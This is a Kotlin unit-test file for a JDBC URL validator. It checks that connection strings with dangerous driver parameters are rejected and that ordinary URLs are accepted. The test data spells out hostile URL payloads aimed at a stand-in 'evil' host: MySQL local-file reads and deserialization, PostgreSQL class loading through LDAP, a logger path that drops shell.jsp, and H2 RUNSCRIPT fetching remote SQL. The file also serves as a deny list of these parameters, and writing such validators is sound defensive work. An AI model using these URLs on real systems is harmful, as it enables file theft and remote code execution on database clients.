package io.kudos.ability.data.rdb.jdbc.kit

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * Unit tests for [JdbcUrlValidator]: every denied parameter family, both parameter syntaxes
 * (`?a=1&b=2` and `;a=1;b=2`), case / whitespace evasion, and the legitimate urls that must keep
 * working.
 *
 * @author K
 * @since 1.0.0
 */
internal class JdbcUrlValidatorTest {

    // ----- denied -----

    @Test
    fun mysqlLocalFileReadParameters_areRefused() {
        // a malicious server replies to any query with a LOAD DATA LOCAL INFILE request; with this
        // flag on, the driver hands over a file from THIS host
        listOf(
            "jdbc:mysql://evil:3306/db?allowLoadLocalInfile=true",
            "jdbc:mysql://evil:3306/db?allowLoadLocalInfileInPath=/",
            "jdbc:mysql://evil:3306/db?allowUrlInLocalInfile=true",
            "jdbc:mariadb://evil:3306/db?useLocalInfile=true",
        ).forEach { url ->
            assertFailsWith<IllegalArgumentException>("must refuse: $url") { JdbcUrlValidator.validate(url) }
        }
    }

    @Test
    fun mysqlCodeExecutionParameters_areRefused() {
        listOf(
            "jdbc:mysql://evil/db?autoDeserialize=true",
            "jdbc:mysql://evil/db?queryInterceptors=com.evil.Rce",
            "jdbc:mysql://evil/db?statementInterceptors=com.evil.Rce",
            "jdbc:mysql://evil/db?propertiesTransform=com.evil.Rce",
        ).forEach { url ->
            assertFailsWith<IllegalArgumentException>("must refuse: $url") { JdbcUrlValidator.validate(url) }
        }
    }

    @Test
    fun postgresClassLoadingParameters_areRefused() {
        listOf(
            "jdbc:postgresql://h/db?socketFactory=javax.naming.InitialContext",
            "jdbc:postgresql://h/db?socketFactoryArg=ldap://evil/x",
            "jdbc:postgresql://h/db?sslfactory=com.evil.Rce",
            "jdbc:postgresql://h/db?sslfactoryarg=ldap://evil/x",
            "jdbc:postgresql://h/db?sslhostnameverifier=com.evil.Rce",
            "jdbc:postgresql://h/db?loggerFile=/app/webroot/shell.jsp",
        ).forEach { url ->
            assertFailsWith<IllegalArgumentException>("must refuse: $url") { JdbcUrlValidator.validate(url) }
        }
    }

    @Test
    fun h2ConnectTimeSqlParameters_areRefused() {
        // H2 uses ';' as the parameter separator — the scan must handle that shape too
        listOf(
            "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/poc.sql'",
            "jdbc:h2:mem:test;RUNSCRIPT=x",
        ).forEach { url ->
            assertFailsWith<IllegalArgumentException>("must refuse: $url") { JdbcUrlValidator.validate(url) }
        }
    }

    @Test
    fun evasionByCaseOrWhitespace_stillRefused() {
        listOf(
            "jdbc:mysql://evil/db?ALLOWLOADLOCALINFILE=true",
            "jdbc:mysql://evil/db?AlLowLoadLocalInfile=true",
            "jdbc:mysql://evil/db? allowLoadLocalInfile =true",
            "jdbc:h2:mem:t;init=RUNSCRIPT FROM 'http://evil/x.sql'",
        ).forEach { url ->
            assertFailsWith<IllegalArgumentException>("must refuse: $url") { JdbcUrlValidator.validate(url) }
        }
    }

    @Test
    fun deniedParameterHiddenAmongLegitimateOnes_isStillFound() {
        val url = "jdbc:mysql://h/db?useSSL=true&characterEncoding=utf8&autoDeserialize=true&connectTimeout=1000"
        val e = assertFailsWith<IllegalArgumentException> { JdbcUrlValidator.validate(url) }
        assertTrue(e.message!!.contains("autodeserialize"), "the message must name the offending parameter")
    }

    @Test
    fun errorMessageDoesNotEchoTheUrl() {
        // urls routinely embed credentials; the diagnostic must not leak them into logs
        val e = assertFailsWith<IllegalArgumentException> {
            JdbcUrlValidator.validate("jdbc:mysql://h/db?user=root&password=s3cret&autoDeserialize=true")
        }
        assertFalse(e.message!!.contains("s3cret"), "must not echo the url (it carries credentials)")
    }

    // ----- allowed -----

    @Test
    fun ordinaryUrlsAreAccepted() {
        listOf(
            "jdbc:h2:mem:test;DATABASE_TO_LOWER=TRUE;DB_CLOSE_DELAY=-1",
            "jdbc:mysql://localhost:3306/db?useSSL=true&characterEncoding=utf8&serverTimezone=UTC",
            "jdbc:postgresql://localhost:5432/db?currentSchema=public&ApplicationName=kudos",
            "jdbc:oracle:thin:@localhost:1521:orcl",
            "jdbc:sqlserver://localhost:1433;databaseName=db;encrypt=true",
            "jdbc:clickhouse://localhost:8123/default",
        ).forEach { url ->
            JdbcUrlValidator.validate(url) // must not throw
            assertTrue(JdbcUrlValidator.isSafe(url), "should be safe: $url")
        }
    }

    @Test
    fun riskWideningButLegitimateParameters_areDeliberatelyAllowed() {
        // allowMultiQueries only widens existing SQL-injection impact; refusing it would break
        // working deployments without removing a capability an attacker doesn't already have
        JdbcUrlValidator.validate("jdbc:mysql://localhost/db?allowMultiQueries=true")
    }

    @Test
    fun parameterNamesThatMerelyContainADeniedWord_areAllowed() {
        // substring matching would be too eager: these are distinct, harmless parameters
        JdbcUrlValidator.validate("jdbc:h2:mem:test;INITIAL_SIZE=5")
        JdbcUrlValidator.validate("jdbc:mysql://h/db?socketFactoryTimeout=10")
    }

    @Test
    fun isSafe_mirrorsValidateWithoutThrowing() {
        assertFalse(JdbcUrlValidator.isSafe("jdbc:mysql://h/db?autoDeserialize=true"))
        assertTrue(JdbcUrlValidator.isSafe("jdbc:mysql://h/db?useSSL=true"))
        assertEquals(true, JdbcUrlValidator.isSafe("jdbc:h2:mem:plain"))
    }
}
